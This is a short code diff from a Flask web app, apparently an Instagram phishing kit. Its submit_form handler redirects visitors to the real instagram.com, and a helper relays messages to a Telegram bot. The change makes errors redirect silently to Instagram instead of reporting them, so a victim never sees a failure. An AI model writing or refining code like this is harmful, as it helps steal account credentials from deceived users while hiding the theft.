@@ -237,7 +237,9 @@ def submit_form():
         return redirect("https://www.instagram.com/")
 
     except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)})
+        return redirect("https://www.instagram.com/")
+
+        # return jsonify({'status': 'error', 'message': str(e)})
 
 def send_message_to_telegram(message):
     telegram_api_url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
